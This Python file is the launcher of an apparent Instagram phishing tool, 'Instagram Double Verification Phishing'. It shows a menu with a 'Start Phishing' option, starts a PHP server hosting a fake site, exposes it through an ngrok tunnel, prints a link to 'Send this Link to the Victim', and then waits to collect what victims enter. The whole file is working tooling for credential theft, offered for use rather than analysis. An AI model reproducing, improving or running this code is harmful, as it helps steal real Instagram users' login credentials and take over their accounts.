import os 
import sys 
import time 
import re
from Core.Requirements import hasngrok
from Core.Data import Collector
from Core import info

RED = "\033[91m"
RESET = "\033[0m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
GREEN='\033[32m'
lightcyan='\033[96m'

def banner(x): 
    a='''\033[31m
   
            ,:\\      /:.      8888888 8888888b.  888     888 8888888b.
   
           //  \\_()_/  \\\\       888   888  "Y88b 888     888 888   Y88b
   
          ||   |    |   ||      888   888    888 888     888 888    888
   
          ||   |    |   ||      888   888    888 Y88b   d88P 888   d88P
   
          ||   |____|   ||      888   888    888  Y88b d88P  8888888P"
   
           \\\\  / || \\  //       888   888    888   Y88o88P   888
   
            `;/  ||  \\;'        888   888  .d88P    Y888P    888
   
                 ||           8888888 8888888P"      Y8P     888
   
                 ||
   
                 XX        \033[36m    (Instagram Double Verification Phishing) \033[31m
   
                 XX
   
                 XX        \033[91m              Author ► RobinHood\033[0m\033[31m
   
                 XX
   
                 OO        \033[36m   Github: https://github.com/The-Robin-Hood \033[31m
   
                 OO  \033[0m'''

    for _ in a.rsplit('''
    '''):
        sys.stdout.write(_)
        sys.stdout.flush()
        time.sleep(x)
def clrscr():   
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def List():
    print(CYAN+"\n\nChoose an Option:"+RESET)
    print(YELLOW +"\n 1. Start Phishing\n 2. About\n 3. Exit"+RESET)
    option = input(GREEN+"\n#root~ "+YELLOW)
    if (option == '1'):
        menu(1)
        main()
    elif (option == '2'):
        menu(1)
        info.about()
        menu(0)
    elif (option == '3'):
        exit()
    else:
        menu(2)
        List()

def menu(value):
    if value == 0:
        clrscr()
        banner(0.1)
        List()
    elif value == 1:
        clrscr()
        banner(0)
    elif value == 2:
        clrscr()
        print(RED+"\nEnter a Valid Option"+RESET)
        banner(0)


def main():
    print(YELLOW+"\nDo You want to use Ngrok?(Y/N)"+RESET)
    print(YELLOW+"\n99 -> Back"+RESET)
    ngrok=input(GREEN+"\n#root~ ")
    if ngrok in ['Y','y']:
        hasngrok()
        x = 1
    elif ngrok in ['N','n']:
        x = 0
    elif ngrok == '99':
        menu(0)
    else:
        menu(2)
        main()
    phpserver(x)


def phpserver(a): 
    print(YELLOW+"\n[!] "+RED+"Starting the php server ...\n")
    if os.name == 'nt':
        os.system('start cmd /c "cd Core/website/ && php -S 0.0.0.0:8080"')
    else:
        os.system('xterm -e "cd Core/website/ && php -S 0.0.0.0:8080" &')
    
    if (a==1):
        os.popen('ngrok http 8080 >temp &')
        time.sleep(10)
        vict=YELLOW+"[!] "+RED+"Send this Link to the Victim:"
        if os.name=='nt':
            print(vict)
            ngroklink=os.popen('curl -s -N http://127.0.0.1:4040/api/tunnels').read()
            r = re.findall(r"https://\w+",ngroklink)
            print(r[0]+".ngrok.io")
        else:
            print(vict)
            os.system(r'curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io"')
    if(a==0):
        print(lightcyan+"\nHosting in localhost Use Ngrok For Public Hosting !!")
        print("\nVisit https://ngrok.com and install it in the path")
        print("\nDon't forget to include the ngrok authtoken")
        print("\nhttp://127.0.0.1:8080")
    print(YELLOW+"\n[!] "+RED+"Waiting For the Victim to Open...\n")
    Collector()